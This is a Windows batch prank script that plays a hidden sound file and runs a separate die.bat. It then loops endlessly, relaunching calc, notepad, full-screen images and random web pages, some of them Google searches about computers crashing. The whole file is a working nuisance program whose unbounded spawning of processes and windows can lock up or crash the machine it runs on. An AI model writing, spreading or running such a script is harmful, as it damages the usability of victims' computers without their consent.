pushd %~dp0
start /min sound.vbs
start calc 
start notepad
start /max "" "%~dp0/data/beanos.jpg"
goto selectweb
:random 
start %web%
start /max "" "%~dp0/data/beanos.jpg"
timeout 3
start /max "" "%~dp0/data/example.jpg"
start calcs
start notepad
start die.bat
start %web%
goto selectweb

:selectweb
set /a webrandom=%random% %%6 +1 
if '%webrandom%'=='1' set web= https://www.google.com/search?q=how+to+stop+a+crash+in+a+computer&rlz=1C1CHBD_esES967ES967&sxsrf=AOaemvKTZppL45VnWfeVZzVTaKEjrFVWpA%3A1642038833816&ei=MYbfYfCgMZGfptQPop6V4AU&ved=0ahUKEwiw_ZWrz631AhWRj4kEHSJPBVwQ4dUDCA4&uact=5&oq=how+to+stop+a+crash+in+a+computer&gs_lcp=Cgdnd3Mtd2l6EAMyCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeOgcIABBHELADOgYIABAWEB46CAgAEBYQChAeSgQIQRgASgQIRhgASgUIRBiBBkoECEMYA1DdBliJIWDQI2gBcAJ4AIABwwGIAYsRkgEEMC4xNJgBAKABAcgBCMABAQ&sclient=gws-wiz
if '%webrandom%'=='2' set web= https://theuselessweb.com/
if '%webrandom%'=='3' set web= https://www.google.com/search?q=what+happens+when+your+computer+crashes%3F&rlz=1C1CHBD_esES967ES967&sxsrf=AOaemvL7nLtlzNq_K8B6776RH6y4epM-jw%3A1642039299235&ei=A4jfYamuDfCaptQP7riwyAM&ved=0ahUKEwjpu4yJ0a31AhVwjYkEHW4cDDkQ4dUDCA4&uact=5&oq=what+happens+when+your+computer+crashes%3F&gs_lcp=Cgdnd3Mtd2l6EAMyBggAEBYQHjIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjoHCAAQRxCwA0oECEEYAEoECEYYAEoFCEQY-QVKBAhDGANQoxVYoxVgqBhoAXACeACAAY8BiAGPAZIBAzAuMZgBAKABAcgBCMABAQ&sclient=gws-wiz
if '%webrandom%'=='4' set web= https://random-website.com/
if '%webrandom%'=='5' set web= https://www.bestuselesswebsites.com/
if '%webrandom%'=='6' set web= https://www.google.com/search?q=why+my+computer+is+crashing%3F&rlz=1C1CHBD_esES967ES967&sxsrf=AOaemvKEM7GWwnHKL_thkZZlmNIpZyFYxQ%3A1642039743869&ei=v4nfYafLNO-bptQP6cahkA4&ved=0ahUKEwjnpo_d0q31AhXvjYkEHWljCOIQ4dUDCA4&uact=5&oq=why+my+computer+is+crashing%3F&gs_lcp=Cgdnd3Mtd2l6EAMyBAgAEB4yBggAEAUQHjIGCAAQBRAeMgYIABAIEB4yBggAEAgQHjIGCAAQCBAeMgYIABAIEB4yBggAEAgQHjIGCAAQCBAeMgYIABAIEB46BwgAEEcQsAM6BggAEAcQHjoFCAAQywE6CAgAEAgQBxAeSgQIQRgASgQIRhgASgUIRBj7BUoECEMYA1C8Blj2F2CHH2gBcAJ4AIABoQGIAakMkgEEMC4xMZgBAKABAcgBCMABAQ&sclient=gws-wiz
goto random